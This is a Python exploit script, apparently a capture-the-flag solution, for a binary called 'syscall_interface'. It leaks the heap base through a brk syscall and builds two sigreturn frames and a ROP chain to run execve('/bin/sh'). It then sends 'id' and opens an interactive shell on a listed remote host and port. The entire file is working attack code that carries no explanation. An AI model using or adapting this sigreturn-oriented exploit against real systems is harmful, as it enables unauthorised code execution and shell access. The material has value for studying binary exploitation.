#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './syscall_interface'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'139.180.144.86', 'port':20004})
env.select()

#==========

binf = ELF(bin_file)
offset_plt_syscall  = binf.plt['syscall']
offset_stub_syscall = 0x00000ec0

#==========

def attack(conn, **kwargs):
    sys = SyscallInterface(conn)

    addr_heap_base   = int(sys.syscall(constants.SYS_brk.numerator, 0), 16)
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    # binf.address        = addr_heap_base - 0x203000
    binf.address        = addr_heap_base - 0x620000
    addr_stub_syscall   = binf.address + offset_stub_syscall
    addr_plt_syscall    = binf.address + offset_plt_syscall

    frame = SigreturnFrame()
    frame.rip = addr_stub_syscall
    frame.rax = constants.SYS_read
    frame.rsi = 0           # can not touch
    frame.rdx = addr_heap_base
    frame.rcx = 0x100
    frame.rsp = addr_heap_base + 0x10
    frame.csgsfs = 0x002b000000000033

    sys.name(str(frame)[0x78:])
    sys.syscall(constants.SYS_rt_sigreturn.numerator, 0, False)

    rop = ROP(binf)
    rop.call(addr_plt_syscall, [constants.SYS_rt_sigreturn.numerator])

    frame = SigreturnFrame()
    frame.rip = addr_stub_syscall
    frame.rax = constants.SYS_execve
    frame.rsi = addr_heap_base
    frame.rdx = 0
    frame.rcx = 0
    frame.rsp = addr_heap_base + 0x100
    frame.csgsfs = 0x002b000000000033

    conn.send('/bin/sh\x00'+str(rop)+str(frame))

    conn.sendline('id')
    print conn.recvuntil('\n')
    
class SyscallInterface:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def syscall(self, no, arg, wait=True):
        self.sendlineafter('choice:', '0')
        self.sendlineafter('number:', str(no))
        self.sendlineafter('argument:', str(arg))
        if wait:
            self.recvuntil('RET(')
            return self.recvuntil(')', drop=True)

    def name(self, data):
        self.sendlineafter('choice:', '1')
        self.sendafter('username:', data[:0x7f])

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()
    
#==========
